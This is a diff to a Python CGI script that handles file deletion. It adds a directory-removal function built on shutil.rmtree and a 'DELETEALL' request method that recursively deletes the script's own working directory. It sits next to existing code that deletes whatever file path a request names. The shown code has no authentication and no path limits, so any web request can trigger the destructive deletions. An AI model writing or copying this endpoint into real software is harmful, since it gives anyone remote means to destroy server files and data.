@@ -3,6 +3,7 @@
 import os
 import cgi
 import cgitb
+import shutil
 
 cgitb.enable()
 
@@ -10,6 +11,17 @@ def delete_file(path):
     try:
         if os.path.isfile(path):
             os.remove(path)
+            return True
+        else:
+            return False
+    except Exception as e:
+        print(f"<html><body><h1>Error: {e}</h1></body></html>")
+        return False
+
+def delete_directory(path):
+    try:
+        if os.path.isdir(path):
+            shutil.rmtree(path)
             return True
         else:
             return False
@@ -35,6 +47,12 @@ def main():
             print("<html><body><h1>Deletion successful</h1></body></html>")
         else:
             print(f"<html><body><h1>Deletion failed: Target does not exist {target_path}</h1></body></html>")
+    elif method == 'DELETEALL':
+        current_dir = os.getcwd()
+        if delete_directory(current_dir):
+            print("<html><body><h1>Deletion successful</h1></body></html>")
+        else:
+            print(f"<html><body><h1>Deletion failed: Target does not exist {current_dir}</h1></body></html>")
     else:
         print(f"<html><body><h1>Invalid method: {method}</h1></body></html>")
 
